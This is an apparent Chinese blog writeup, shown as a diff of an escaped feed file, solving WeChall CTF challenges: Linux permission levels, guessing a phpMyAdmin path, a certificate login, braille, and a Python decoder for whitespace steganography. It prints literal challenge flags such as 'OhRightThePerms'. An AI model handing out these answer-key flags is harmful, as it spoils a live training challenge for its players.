+&lt;p&gt;用户名和组名都是我自己，只要加一下可读即可。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$catcher@warchall ~/level/4 $ chmod 700 README.txt 
+$catcher@warchall ~/level/4 $ cat README.txt 
+AndIknowchown
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$catcher@warchall ~/level/5 $ cat README.txt 
+Protect your /home/user/catcher/level directory from other users. Then wait 5 minutes.
+
+$catcher@warchall ~ $ ls -l
+总用量 8
+drwx---r-x 5 catcher catcher 4096 8月  23 15:35 level
+-r--r--r-- 1 catcher catcher  463 1月  18 2014 WELCOME.txt
+$catcher@warchall ~/level/5 $ cat solution.txt 
+cat: solution.txt: 权限不够
+$catcher@warchall ~/level/5 $ chmod 700 solution.txt
+$catcher@warchall ~/level/5 $ cat solution.txt 
+The solution to level 5 is 'OhRightThePerms', without the quotes.
+OhRightThePerms
+
+bitwarrior,LameStartup,HiddenIsConfig,RepeatingHistory,AndIknowchown,OhRightThePerms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/blog/wechall1.png&quot; alt=&quot;pic1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;a href=&quot;http://www.chiange.com/wechall-training-warchall-the-beginning-realistic-linux-shell-warchall/&quot;&gt;[WeChall] Training: Warchall – The Beginning (Realistic, Linux, Shell, Warchall)&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;29repeating-history&quot;&gt;29.Repeating History&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;首先去 github 该项目的地址上找到该题目的文件夹&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;第一部分在   repeating 文件夹下&lt;/p&gt;
+
+&lt;p&gt;第二部分 在 history 文件夹下，查找 install.php 的历史记录找到正确的 solution&lt;/p&gt;
+
+&lt;h2 id=&quot;30php-my-admin&quot;&gt;30.PHP My Admin&lt;/h2&gt;
+
+&lt;p&gt;这道题要看下讨论区里面给的一些提示&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;网上查一下一般PHPMyAdmin会放在哪个路径下。会发现&lt;code class=&quot;highlighter-rouge&quot;&gt; http://www.wechall.net/phpmyadmin&lt;/code&gt; 最多，另外 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.wechall.net/pma&lt;/code&gt;也是有人用的，因为通常就把PHPMyAdmin简称为pma。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pma.wechall.net/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;31training-caterpillar&quot;&gt;31.Training: Caterpillar&lt;/h2&gt;
+
+&lt;h2 id=&quot;32auth-me&quot;&gt;32.AUTH me&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;tips:&lt;/strong&gt;到&lt;code class=&quot;highlighter-rouge&quot;&gt;find_me&lt;/code&gt;路径下找到 &lt;code class=&quot;highlighter-rouge&quot;&gt;p12&lt;/code&gt;证书，然后火狐浏览器中&lt;code class=&quot;highlighter-rouge&quot;&gt;你的证书&lt;/code&gt;中导入该证书即可，后面要求输入密码，密码为空。&lt;/p&gt;
+
+&lt;h2 id=&quot;33interesting&quot;&gt;33.Interesting&lt;/h2&gt;
+
+&lt;h2 id=&quot;34wanda&quot;&gt;34.Wanda&lt;/h2&gt;
+
+&lt;h2 id=&quot;35railsbin&quot;&gt;35.Railsbin&lt;/h2&gt;
+
+&lt;h2 id=&quot;36connect-the-dots&quot;&gt;36.Connect the Dots&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;盲文密码，找到对应的盲文密码对应表即可&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;thesolutionisXXX&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;37hi&quot;&gt;37.hi&lt;/h2&gt;
+
+&lt;p&gt;大数的计算，发现一个在线的网站&lt;a href=&quot;http://www.wolframalpha.com/&quot;&gt;wolframalpha&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;38stegano-woman&quot;&gt;38.Stegano Woman&lt;/h2&gt;
+
+&lt;p&gt;这道题你如果用现成的工具来解压缩肯定是做不出来的。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ unzip stegano_woman.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;回显&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Archive:  stegano_woman.zip
+Stegano
+	 	 	 			  	 			  		 	 		 					   		  	  	    	  	  			   	   	 			  	 		 	  	    	  	   			 						  	 		 	   		  		 		  		 			  				 	  	   		  		   	  		 	 	   		 		  	    	   	 	 	   	  		 						  	  	  	 		 	  		  		  		   	
+  inflating: 1.jpg                   
+  inflating: 2.jpg       
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;使用16进制编辑器打开，发现中间那段空白的部分是09(tab)和20(space)&lt;/p&gt;
+
+&lt;p&gt;把其中的一个当作1另一个当作0，换成二进制再转换成字符串之后输出即可&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#coding: utf-8&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'stegano_woman.zip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Stegano'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 上面这个获取的是 S 的下标&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#['S', 't', 'e', 'g', 'a', 'n', 'o', '\r', '\n']&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 所以这里要从 9 开始&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; 
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……</summary></entry></feed>
